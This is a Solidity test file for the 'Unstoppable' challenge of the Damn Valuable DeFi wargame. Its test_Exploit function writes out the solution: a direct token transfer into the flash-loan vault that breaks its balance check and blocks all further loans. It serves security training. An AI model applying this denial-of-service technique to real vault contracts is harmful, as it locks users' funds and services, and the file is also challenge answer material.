// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DamnValuableToken} from "src/DamnValuableToken.sol";
import {ReceiverUnstoppable} from "src/unstoppable/ReceiverUnstoppable.sol";
import {UnstoppableVault} from "src/unstoppable/UnstoppableVault.sol";

contract UnstoppableTest is Test {
    uint256 constant TOKENS_IN_VAULT = 1_000_000 * 10**18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10 * 10**18;

    address deployer;
    address player;
    address other;

    DamnValuableToken token;
    UnstoppableVault vault;
    ReceiverUnstoppable receiverContract;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        deployer = makeAddr("DEPLOYER");
        player = makeAddr("PLAYER");
        other = makeAddr("OTHER");

        vm.startPrank(deployer);
        token = new DamnValuableToken();
        vm.label(address(token), "TOKEN");

        vault = new UnstoppableVault(token, deployer, deployer);
        vm.label(address(vault), "VAULT");

        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);

        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
        vm.stopPrank();

        vm.prank(other);
        receiverContract = new ReceiverUnstoppable(address(vault));
    }

    function test_SetUpState() public {
        assertEq(address(vault.asset()), address(token));

        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(
            vault.flashFee(address(token), TOKENS_IN_VAULT),
            50000 * 10**18
        );

        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Show it's possible for other to take out a flash loan
        vm.prank(other);
        receiverContract.executeFlashLoan(100 * 10**18);
    }

    function test_Exploit() public {
        /**
         * SOLUTION
         */
        vm.prank(player);
        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);

        /**
         * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
         */

        // It is no longer possible to execute flash loans
        vm.prank(other);
        vm.expectRevert();
        receiverContract.executeFlashLoan(100 * 10**18);
    }
}
